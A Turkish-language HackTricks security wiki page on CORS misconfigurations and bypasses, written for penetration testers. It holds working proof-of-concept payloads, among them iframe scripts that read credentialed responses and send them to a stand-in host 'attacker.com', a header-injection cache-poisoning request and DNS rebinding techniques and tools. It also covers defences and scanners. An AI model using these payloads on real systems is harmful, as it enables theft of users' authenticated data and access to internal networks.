# CORS - Yanlış Yapılandırmalar ve Atlatma

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## CORS Nedir?

Çapraz Kaynak Paylaşımı (CORS) standardı **sunucuların varlıklarına kimin erişebileceğini** ve **harici kaynaklardan hangi HTTP istek yöntemlerinin izinli olduğunu** tanımlamasına olanak tanır.

**Aynı köken** politikası, bir **kaynağı isteyen sunucu** ile **kaynağı barındıran sunucunun** aynı protokolü (örneğin, `http://`), alan adını (örneğin, `internal-web.com`) ve **portu** (örneğin, 80) paylaşmasını zorunlu kılar. Bu politika altında, yalnızca aynı etki alanı ve porttan gelen web sayfalarına kaynaklara erişim izinlidir.

`http://normal-website.com/example/example.html` bağlamında aynı köken politikasının uygulanması aşağıdaki gibi gösterilmiştir:

| Erişilen URL                              | Erişime izin verildi mi?                       |
| ----------------------------------------- | --------------------------------------- |
| `http://normal-website.com/example/`      | Evet: Aynı şema, etki alanı ve port |
| `http://normal-website.com/example2/`     | Evet: Aynı şema, etki alanı ve port |
| `https://normal-website.com/example/`     | Hayır: Farklı şema ve port           |
| `http://en.normal-website.com/example/`   | Hayır: Farklı etki alanı                    |
| `http://www.normal-website.com/example/`  | Hayır: Farklı etki alanı                    |
| `http://normal-website.com:8080/example/` | Hayır: Farklı port\*                    |

\*Internet Explorer, aynı köken politikasını uygularken port numarasını dikkate almaz, bu nedenle bu erişime izin verir.

### `Access-Control-Allow-Origin` Başlığı

Bu başlık **birden fazla kökeni**, bir **`null`** değerini veya bir joker **`*`** değerini izin verebilir. Ancak, **hiçbir tarayıcı birden fazla kökeni desteklemez**, ve joker `*` kullanımı **sınırlamalara** tabidir. (Joker yalnız kullanılmalıdır ve `Access-Control-Allow-Credentials: true` ile birlikte kullanımı izin verilmez.)

Bu başlık, tarayıcı tarafından otomatik olarak bir `Origin` başlığı eklenen bir web sitesi tarafından başlatılan çapraz etki alanı kaynağı isteğine sunucu tarafından **verilir**.

### `Access-Control-Allow-Credentials` Başlığı

**Varsayılan olarak**, çapraz köken istekler, çerezler veya Yetkilendirme başlığı gibi kimlik bilgileri olmadan yapılır. Ancak, bir çapraz etki alan sunucusu, kimlik bilgileri gönderildiğinde yanıtın okunmasına izin verebilir ve bunu `Access-Control-Allow-Credentials` başlığını **`true`** olarak ayarlayarak yapabilir.

`true` olarak ayarlandığında, tarayıcı kimlik bilgilerini (çerezler, yetkilendirme başlıkları veya TLS istemci sertifikaları) iletecektir.
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Ön uçuş isteği

### Çapraz Alan İletişiminde Ön Uçuş İsteklerini Anlama

Belirli koşullar altında çapraz alan isteği başlatılırken, örneğin **standart olmayan bir HTTP yöntemi** kullanılarak (HEAD, GET, POST dışında herhangi bir şey), yeni **başlıklar** tanıtılarak veya özel bir **Content-Type başlık değeri** kullanılarak, bir ön uçuş isteği gerekebilir. Bu ön hazırlık isteği, **`OPTIONS`** yöntemini kullanarak sunucuyu gelecek çapraz köken isteğin niyetleri hakkında bilgilendirir, kullanmayı planladığı HTTP yöntemlerini ve başlıkları içerir.

**Çapraz Köken Kaynak Paylaşımı (CORS)** protokolü, bu ön uçuş kontrolünü zorunlu kılar, istenilen çapraz köken işleminin uygunluğunu doğrulayarak izin verilen yöntemleri, başlıkları ve kökenin güvenilirliğini kontrol eder. Bir ön uçuş isteğinin gerekli olmadığı durumları ayrıntılı olarak anlamak için [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests) tarafından sağlanan kapsamlı kılavuza başvurun.

**Ön uçuş isteğinin olmamasının, yanıtın yetkilendirme başlıklarını taşıma gerekliliğini ortadan kaldırmadığını** unutmamak önemlidir. Bu başlıklar olmadan tarayıcı, çapraz köken isteğinden gelen yanıtı işleme yeteneğinden yoksun kalır.

Aşağıdaki örneği göz önünde bulundurun, bu örnekte `PUT` yöntemini kullanarak ve `Special-Request-Header` adında özel bir başlık ekleyerek bir ön uçuş isteği yapılmaktadır:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
Sunucu, aşağıda gösterildiği gibi kabul edilen yöntemleri, izin verilen kaynağı ve diğer CORS politika ayrıntılarını belirten başlıklar döndürebilir:
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
* **`Access-Control-Allow-Headers`**: Bu başlık, gerçek istek sırasında hangi başlıkların kullanılabileceğini belirtir. Sunucu tarafından, istemciden gelen isteklerde izin verilen başlıkları göstermek için ayarlanır.
* **`Access-Control-Expose-Headers`**: Bu başlık aracılığıyla sunucu, basit yanıt başlıklarının yanı sıra yanıtın bir parçası olarak hangi başlıkların açıklanabileceği konusunda istemciyi bilgilendirir.
* **`Access-Control-Max-Age`**: Bu başlık, bir ön uçuş isteğinin sonuçlarının ne kadar süreyle önbelleğe alınabileceğini belirtir. Sunucu, ön uçuş isteği tarafından döndürülen bilgilerin ne kadar süreyle yeniden kullanılabileceğini saniye cinsinden belirler.
* **`Access-Control-Request-Headers`**: Ön uçuş isteklerinde kullanılan bu başlık, istemci tarafından gerçek istekte hangi HTTP başlıklarının kullanılacağını sunucuya bildirmek için ayarlanır.
* **`Access-Control-Request-Method`**: Bu başlık da ön uçuş isteklerinde kullanılır ve istemci tarafından gerçek istekte hangi HTTP yönteminin kullanılacağını belirtmek için ayarlanır.
* **`Origin`**: Bu başlık tarayıcı tarafından otomatik olarak ayarlanır ve çapraz köken isteğinin kökenini gösterir. Sunucu, gelen isteğin CORS politikasına dayanarak izin verilip verilmeyeceğini değerlendirmek için bunu kullanır.

Genellikle (içerik türüne ve ayarlanan başlıklara bağlı olarak) **GET/POST isteğinde ön uçuş isteği gönderilmez** (isteğin **doğrudan** gönderilir), ancak yanıtın **başlıklarını/gövdesini erişmek istiyorsanız**, buna izin veren bir _Access-Control-Allow-Origin_ başlığı içermelidir.\
**Bu nedenle, CORS CSRF'ye karşı koruma sağlamaz (ancak faydalı olabilir).**

### **Yerel Ağ İstekleri Ön Uçuş İsteği**

1. **`Access-Control-Request-Local-Network`**: Bu başlık, istemcinin isteğine dahil edilir ve sorgunun yerel ağ kaynağına yönelik olduğunu belirtir. Sunucuya, isteğin yerel ağdan geldiğini bildirmek için bir işaret olarak hizmet eder.
2. **`Access-Control-Allow-Local-Network`**: Yanıt olarak, sunucular istenen kaynağın yerel ağ dışındaki varlıklarla paylaşılmasına izin verildiğini iletmek için bu başlığı kullanır. Farklı ağ sınırları arasında kaynakların paylaşılmasına yeşil ışık yakarak, güvenlik protokollerini korurken kontrollü erişimi sağlar.

**Yerel ağ isteğine izin veren geçerli bir yanıtın**, ayrıca yanıtta `Access-Controls-Allow-Local_network: true` başlığını içermesi gerekir:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Linux **0.0.0.0** IP'si, bu gereksinimleri atlamak için **yerel** olarak kabul edilmeyen bir IP adresi olduğundan localhost'a erişmek için çalışır.

Ayrıca, **yerel ağ gereksinimlerini atlamak** mümkündür, eğer **yerel bir uç noktanın genel IP adresini** kullanıyorsanız (örneğin yönlendiricinin genel IP'si). Çünkü birkaç durumda, **genel IP** erişiliyorsa, eğer **yerel ağdan** erişiliyorsa, erişim sağlanacaktır.
{% endhint %}

## Sömürülebilir yanlış yapılandırmalar

`Access-Control-Allow-Credentials` ayarının **`true`** olarak ayarlanmasının çoğu **gerçek saldırılar** için bir önkoşul olduğu gözlemlenmiştir. Bu ayar, tarayıcının kimlik bilgilerini göndermesine ve yanıtı okumasına izin verir, saldırının etkinliğini artırır. Bu olmadan, tarayıcının bir istek göndermesini sağlamak yerine kendiniz yapmanın faydası azalır, çünkü bir kullanıcının çerezlerini kullanmak olanaksız hale gelir.

### İstisna: Ağ Konumunun Kimlik Doğrulaması Olarak Sömürme

Kurbanın ağ konumunun kimlik doğrulaması olarak işlev gördüğü bir istisna vardır. Bu, kurbanın tarayıcısının bir proxy olarak kullanılmasına izin verir, IP tabanlı kimlik doğrulamayı atlayarak iç ağ uygulamalarına erişimi sağlar. Bu yöntem, DNS yeniden bağlama ile benzer etkilere sahip olmasına rağmen, daha basit bir şekilde sömürülebilir.

### `Origin`'in `Access-Control-Allow-Origin`'de Yansıtılması

`Origin` başlığının değerinin `Access-Control-Allow-Origin` içinde yansıtıldığı gerçek dünya senaryosu, bu başlıkların birleştirilmesine yönelik kısıtlamalar nedeniyle teorik olarak olası değildir. Bununla birlikte, CORS'u birden fazla URL için etkinleştirmek isteyen geliştiriciler, `Access-Control-Allow-Origin` başlığını `Origin` başlığının değerini kopyalayarak dinamik olarak oluşturabilir. Bu yaklaşım, özellikle bir saldırganın geçerlilik mantığını aldatarak meşru görünmesi için tasarlanmış bir alan adı kullandığında, güvenlik açıklarına neden olabilir.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### `null` Origin'un Sömürülmesi

`null` kökeni, yönlendirmeler veya yerel HTML dosyaları gibi durumlar için belirlendiğinden, benzersiz bir konuma sahiptir. Bazı uygulamalar, yerel geliştirmeyi kolaylaştırmak için bu kökeni beyaz listeye alır ve yanlışlıkla herhangi bir web sitesinin, CORS kısıtlamalarını atlayarak bir `null` kökenini taklit etmesine izin verir. Bu, bir sandboxed iframe aracılığıyla gerçekleştirilir.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Düzenli İfade Atlatma Teknikleri

Bir alan adı beyaz listesiyle karşılaşıldığında, saldırganın alan adını beyaz listeli bir alan adına eklemesi veya alt alan devralma güvenlik açıklarını sömürmesi gibi atlatma fırsatlarını test etmek hayati önem taşır. Ayrıca, alan adı doğrulaması için kullanılan düzenli ifadeler, alan adı adlandırma kurallarındaki ince detayları göz ardı edebilir ve daha fazla atlatma fırsatı sunabilir.

### Gelişmiş Düzenli İfade Atlatmaları

Regex desenleri genellikle alfasayısal, nokta (.), ve kısa çizgi (-) karakterlerine odaklanırken, diğer olasılıkları göz ardı edebilir. Örneğin, tarayıcılar ve regex desenleri tarafından farklı yorumlanan karakterleri içeren bir alan adı, güvenlik kontrollerini atlatmak için kullanılabilir. Safari, Chrome ve Firefox'un alt alanlardaki alt çizgi karakterlerini ele alış şekli, bu tür farklılıkların alan adı doğrulama mantığını atlatmak için nasıl sömürülebileceğini gösterir.

**Bu atlatma kontrolünün daha fazla bilgi ve ayarları için:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **ve** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1\*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (153).png>)

### Bir Alt Alan İçinde XSS'den

Geliştiriciler genellikle, bilgi istemek için izin verilen alan adlarını beyaz listeye alarak CORS sömürüsüne karşı koruyucu mekanizmaları uygularlar. Bu önlemlere rağmen, sistemin güvenliği kusursuz değildir. Beyaz listeli alan adları içinde bile tek bir savunmasız alt alanın varlığı, XSS (Cross-Site Scripting) gibi diğer güvenlik açıklarından dolayı CORS sömürüsüne kapı açabilir.

Örneğin, `requester.com` adlı bir alanın, başka bir alan olan `provider.com`'dan kaynaklara erişimine izin verildiği bir senaryoyu düşünelim. Sunucu tarafı yapılandırması şöyle görünebilir:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
Bu kurulumda, `requester.com` alt alan adlarının hepsine erişim izni verilmiştir. Ancak, bir alt alan adı, örneğin `sub.requester.com`, bir XSS zafiyeti ile tehlikeye düşerse, bir saldırgan bu zayıflığı kullanabilir. Örneğin, `sub.requester.com`'a erişimi olan bir saldırgan, XSS zafiyetini kullanarak CORS politikalarını atlayabilir ve `provider.com` üzerindeki kaynaklara kötü niyetli olarak erişebilir.

### **Sunucu tarafı önbellek zehirlenmesi**

[**Bu araştırmadan**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

HTTP başlığı enjeksiyonu aracılığıyla sunucu tarafı önbellek zehirlenmesini sömürerek, depolanmış Cross-Site Scripting (XSS) zafiyeti uygulanabilir. Bu senaryo, bir uygulamanın `Origin` başlığını yasaklı karakterler için temizlemediğinde ortaya çıkar ve özellikle Internet Explorer ve Edge kullanıcıları için bir zafiyet oluşturur. Bu tarayıcılar (0x0d) 'i meşru bir HTTP başlık terminatorü olarak işler, bu da HTTP başlığı enjeksiyonu zafiyetlerine yol açar.

Aşağıdaki isteği düşünün, burada `Origin` başlığı manipüle edilmiştir:
```
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer ve Edge yanıtı şu şekilde yorumlar:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
Bu zafiyeti doğrudan sömürmek için bir web tarayıcısının hatalı bir başlık göndermesi mümkün olmasa da, Burp Suite gibi araçlar kullanılarak elle oluşturulmuş bir istek ile sunucu tarafında önbelleğe alınan yanıtın başkalarına hizmet edilmesine neden olabilir. Oluşturulan payload, sayfanın karakter setini UTF-7'ye değiştirmeyi amaçlar. UTF-7, belirli bağlamlarda betik olarak yürütülebilecek şekilde karakterleri kodlayabilme yeteneği nedeniyle XSS zafiyetleri ile sıkça ilişkilendirilen bir karakter kodlamasıdır.

Daha fazla bilgi için depolanan XSS zafiyetlerine bakın [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Not**: Özellikle sunucu tarafı önbellek zehirlenmesi yoluyla HTTP başlık enjeksiyonu zafiyetlerinin sömürülmesi, HTTP başlıkları da dahil olmak üzere tüm kullanıcı tarafından sağlanan girdilerin doğrulanması ve temizlenmesinin kritik önemini vurgular. Bu tür zafiyetleri önlemek için girdi doğrulamasını içeren sağlam bir güvenlik modeli kullanın.

### **İstemci Tarafı Önbellek Zehirlenmesi**

[**Bu araştırmadan**](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)

Bu senaryoda, uygun kodlama olmadan özel bir HTTP başlığının içeriğini yansıtan bir web sayfası örneği gözlemlenir. Özellikle, web sayfası, `X-User-id` başlığında bulunan içeriği geri yansıtır; bu içerik kötü niyetli JavaScript içerebilir. Başlık, yüklenirken JavaScript kodunu yürütmeyi amaçlayan bir SVG resim etiketi içerdiğinde gösterildiği gibi.

Çapraz Kaynak Paylaşımı (CORS) politikaları özel başlıkların gönderilmesine izin verir. Ancak, CORS kısıtlamaları nedeniyle tarayıcı tarafından yanıtın doğrudan işlenmemesi durumunda, böyle bir enjeksiyonun faydası sınırlı gibi görünebilir. Kritik nokta, tarayıcının önbellek davranışını düşünürken ortaya çıkar. `Vary: Origin` başlığı belirtilmediğinde, kötü niyetli yanıtın tarayıcı tarafından önbelleğe alınması mümkün hale gelir. Sonuç olarak, bu önbelleğe alınmış yanıt, URL'ye doğrudan gezinildiğinde doğrudan render edilebilir, başlangıçtaki istekte doğrudan render yapma ihtiyacını atlayarak. Bu mekanizma, istemci tarafı önbelleğini kullanarak saldırının güvenilirliğini artırır.

Bu saldırıyı göstermek için, bir JavaScript örneği sağlanmıştır; bir JSFiddle gibi bir web sayfası ortamında yürütülmek üzere tasarlanmıştır. Bu betik basit bir eylem gerçekleştirir: belirtilen URL'ye kötü niyetli JavaScript içeren özel bir başlık içeren bir istek gönderir. Başarılı istek tamamlandığında, hedef URL'ye gitmeye çalışır ve yanıtın `Vary: Origin` başlığının uygun şekilde işlenmemesi durumunda enjekte edilen betiğin yürütülmesini tetikleyebilir.
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Atlat

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, ayrıca Cross-Site Script Inclusion olarak da bilinen, aynı köken politikasının (SOP) script etiketi kullanılarak kaynaklar dahil edildiğinde geçerli olmadığından faydalanılan bir zayıflık türüdür. Bu, scriptlerin farklı alanlardan dahil edilebilmesi gerektiği için geçerlidir. Bu zayıflık, bir saldırganın script etiketi kullanılarak dahil edilen herhangi bir içeriğe erişmesine ve okumasına olanak tanır.

Bu zayıflık, özellikle dinamik JavaScript veya JSONP (JSON ile Dolgulama) söz konusu olduğunda önemli hale gelir, özellikle çerezler gibi ortam yetkilendirme bilgileri kullanıldığında. Farklı bir ana bilgisayardan bir kaynak istendiğinde çerezler dahil edilir ve saldırganın erişimine açık hale gelir.

Bu zayıflığı daha iyi anlamak ve hafifletmek için, web uygulamalarınızda potansiyel XSSI zayıflıklarını tanımlamak ve ele almak için kullanılabilen BurpSuite eklentisini kullanabilirsiniz. [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp) adresinde bulunan bu eklenti, XSSI zayıflıklarını belirlemeye ve ele almaya yardımcı olabilir.

[**Farklı XSSI türleri ve bunları nasıl sömürüleceği hakkında daha fazla bilgi için buraya tıklayın.**](xssi-cross-site-script-inclusion.md)

İsteğe bir **`callback`** **parametresi** eklemeyi deneyin. Belki sayfa, verileri JSONP olarak göndermek üzere hazırlanmıştır. Bu durumda sayfa, CORS politikasını atlayacak olan `Content-Type: application/javascript` ile verileri geri gönderecektir.

![](<../.gitbook/assets/image (229).png>)

### Kolay (faydasız?) atlatma

`Access-Control-Allow-Origin` kısıtlamasını atlatmanın bir yolu, bir web uygulamasından sizin adınıza bir istekte bulunmasını ve yanıtı geri göndermesini istemektir. Ancak, bu senaryoda, son kurbanın kimlik bilgileri farklı bir alan adına yapılan istek nedeniyle gönderilmez.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Bu araç, isteğinizi başlıklarıyla birlikte ileten bir proxy sağlar ve aynı zamanda Origin başlığını istenen alan adıyla eşleştirmek için sahte bir Origin başlığı oluşturur. Bu, CORS politikasını etkili bir şekilde atlar. İşte XMLHttpRequest ile kullanım örneği:
2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Bu araç, isteklerinizi doğrudan iletmek yerine, sunucu belirtilen parametrelerle kendi isteğini yapar.

### Iframe + Popup Atlatma

Bir iframe oluşturarak ve ondan yeni bir pencere açarak `e.origin === window.origin` gibi CORS denetimlerini atlayabilirsiniz. Daha fazla bilgi için aşağıdaki sayfaya bakın:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### TTL Aracılığıyla DNS Rebinding

TTL aracılığıyla DNS rebinding, DNS kayıtlarını manipüle ederek belirli güvenlik önlemlerini atlatmak için kullanılan bir tekniktir. Nasıl çalıştığını aşağıda bulabilirsiniz:

1. Saldırgan bir web sayfası oluşturur ve kurbanın buna erişmesini sağlar.
2. Saldırgan daha sonra kendi alan adının DNS (IP) adresini kurbanın web sayfasına yönlendirir.
3. Kurbanın tarayıcısı DNS yanıtını önbelleğe alır ve bu yanıtın ne kadar süreyle geçerli olacağını belirten bir TTL (Yaşam Süresi) değeri olabilir.
4. TTL süresi dolduğunda, kurbanın tarayıcısı yeni bir DNS isteği yapar, bu da saldırganın kurbanın sayfasında JavaScript kodunu yürütmesine olanak tanır.
5. Saldırgan, kurbanın IP'si üzerinde kontrolü sürdürerek, kurbandan herhangi bir çerezi kurban sunucusuna göndermeden kurbandan bilgi toplayabilir.

Bu tekniğin hemen kötüye kullanılmasını önleyebilecek tarayıcılarda önbellekleme mekanizmaları bulunmaktadır, hatta düşük TTL değerleriyle bile.

DNS rebinding, kurban tarafından gerçekleştirilen açık IP kontrollerini atlatmak veya bir kullanıcının veya botun aynı sayfada uzun süre kalmasına izin veren senaryolarda kullanışlı olabilir, bu da önbelleğin süresinin dolmasına izin verir.

Hızlı bir şekilde DNS rebinding'i kötüye kullanmanız gerekiyorsa, [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) gibi hizmetleri kullanabilirsiniz.

Kendi DNS rebinding sunucunuzu çalıştırmak için **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)) gibi araçları kullanabilirsiniz. Bu, yerel port 53/udp'nizi açığa çıkararak, buna işaret eden bir A kaydı oluşturarak (örneğin, ns.example.com), ve önceden oluşturulan A alt alan adına işaret eden bir NS kaydı oluşturarak yapılır (örneğin, ns.example.com). ns.example.com alt alanının herhangi bir alt alanı daha sonra ana bilgisayarınız tarafından çözümlenir.

Daha fazla anlayış ve deneyim için [http://rebind.it/singularity.html](http://rebind.it/singularity.html) adresinde halka açık çalışan bir sunucuyu keşfedebilirsiniz.

### DNS Rebinding Aracılığıyla **DNS Önbelleği Saldırısı**

DNS rebinding aracılığıyla DNS önbelleği saldırısı, tarayıcıların önbellekleme mekanizmasını atlatmak ve ikinci bir DNS isteği yapmaya zorlamak için kullanılan başka bir tekniktir. Nasıl çalıştığını aşağıda bulabilirsiniz:

1. İlk olarak, kurban bir DNS isteği yapar, bu isteğe saldırganın IP adresiyle yanıt verilir.
2. Önbellek savunmasını atlatmak için saldırgan bir hizmet işçisi kullanır. Hizmet işçisi, DNS önbelleğini doldurur ve bu da önbelleğe alınan saldırgan sunucu adını siler.
3. Kurbanın tarayıcısı ikinci bir DNS isteği yapar, bu sefer genellikle yerel ana bilgisayarı işaret eden 127.0.0.1 IP adresiyle yanıt alır.

Hizmet işçisi aracılığıyla DNS önbelleğini doldurarak, saldırgan DNS çözümleme sürecini manipüle edebilir ve kurbanın tarayıcısını ikinci bir istek yapmaya zorlayabilir, bu sefer istenen saldırgan IP adresine çözülür.

### DNS Rebinding Aracılığıyla **Önbellek**

Önbellek savunmasını atlatmanın başka bir yolu, DNS sağlayıcısında aynı alt alan adı için birden fazla IP adresi kullanmaktır. Nasıl çalıştığını aşağıda bulabilirsiniz:

1. Saldırgan, aynı alt alan adı için DNS sağlayıcısında iki A kaydı (veya iki IP'li tek bir A kaydı) oluşturur.
2. Tarayıcı bu kayıtları kontrol ettiğinde, her iki IP adresini de alır.
3. Tarayıcı saldırganın IP adresini ilk olarak kullanmaya karar verirse, saldırgan, aynı alan adına HTTP istekleri gerçekleştiren bir yük gönderebilir.
4. Ancak saldırgan, kurbanın IP adresini elde ettikten sonra, kurbanın tarayıcısına yanıt vermekten vazgeçer.
5. Tarayıcı, alan adının yanıt vermediğini fark edince, ikinci verilen IP adresini kullanmaya devam eder.
6. İkinci IP adresine erişerek, tarayıcı Aynı Köken Politikasını (SOP) atlar ve saldırgan bu durumu kötüye kullanarak kurbandan bilgi toplayabilir ve dışarı aktarabilir.

Bu teknik, bir alan adı için birden fazla IP adresi sağlandığında tarayıcıların davranışını kullanır. Yanıtları stratejik olarak kontrol ederek ve tarayıcının IP adresi seçimini manipüle ederek, bir saldırgan SOP'yi kötüye kullanabilir ve kurbandan bilgiye erişebilir.

{% hint style="warning" %}
Localhost'a erişmek için Windows'ta **127.0.0.1** ve linux'ta **0.0.0.0**'ı yeniden bağlamayı denemelisiniz.\
Godaddy veya cloudflare gibi sağlayıcılar, 0.0.0.0 IP'sini kullanmama izin vermedi, ancak AWS route53, 2 IP'den birinin "0.0.0.0" olduğu bir A kaydı oluşturmama izin verdi.

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

Daha fazla bilgi için [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/) adresini kontrol edebilirsiniz.
### Diğer Yaygın Atlatmalar

* **Dahili IP'ler izin verilmiyorsa**, muhtemelen **0.0.0.0 yasağı unutulmuş olabilir** (Linux ve Mac'te çalışır)
* **Dahili IP'ler izin verilmiyorsa**, **localhost** için bir **CNAME** ile yanıt verin (Linux ve Mac'te çalışır)
* **Dahili IP'ler izin verilmiyorsa** DNS yanıtlarında, www.corporate.internal gibi **dahili hizmetlere CNAME'ler** yanıtlayabilirsiniz.

### DNS Yeniden Hedefleme Silahlandırılmış

Önceki atlatma teknikleri hakkında daha fazla bilgiyi ve aşağıdaki aracı nasıl kullanacağınızı [Gerald Doussot - DNS Rebinding Saldırılarının Durumu ve Kökenin Tekliği - DEF CON 27 Konferansı](https://www.youtube.com/watch?v=y9-0lICNjOQ) adlı sunumda bulabilirsiniz.

[**`Kökenin Tekliği`**](https://github.com/nccgroup/singularity), [DNS yeniden hedefleme](https://en.wikipedia.org/wiki/DNS\_rebinding) saldırıları gerçekleştirmek için bir araçtır. Saldırı sunucusunun DNS adının IP adresini hedef makinenin IP adresine yeniden hedeflemek ve hedef makinedeki güvenlik açıklarını sömürmek için saldırı yüklerini sunmak için gerekli bileşenleri içerir.

### DNS Yeniden Hedefleme Karşısında Gerçek Koruma

* Dahili hizmetlerde TLS kullanın
* Verilere erişim için kimlik doğrulaması isteyin
* Host başlığını doğrulayın
* [https://wicg.github.io/private-network-access/](https://wicg.github.io/private-network-access/): Genel sunucuların dahili sunuculara erişmek istediğinde her zaman bir önceden uçuş isteği gönderilmesini öneren bir teklif

## **Araçlar**

**CORS politikalarındaki olası yapılandırma hatalarını taramak için Fuzz**

* [https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
* [https://github.com/lc/theftfuzzer](https://github.com/lc/theftfuzzer)
* [https://github.com/s0md3v/Corsy](https://github.com/s0md3v/Corsy)
* [https://github.com/Shivangx01b/CorsMe](https://github.com/Shivangx01b/CorsMe)

## Referanslar

* [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* [https://portswigger.net/web-security/cors/access-control-allow-origin](https://portswigger.net/web-security/cors/access-control-allow-origin)
* [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers#CORS)
* [https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [https://www.codecademy.com/articles/what-is-cors](https://www.codecademy.com/articles/what-is-cors)
* [https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors](https://www.we45.com/blog/3-ways-to-exploit-misconfigured-cross-origin-resource-sharing-cors)
* [https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646](https://medium.com/netscape/hacking-it-out-when-cors-wont-let-you-be-great-35f6206cc646)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
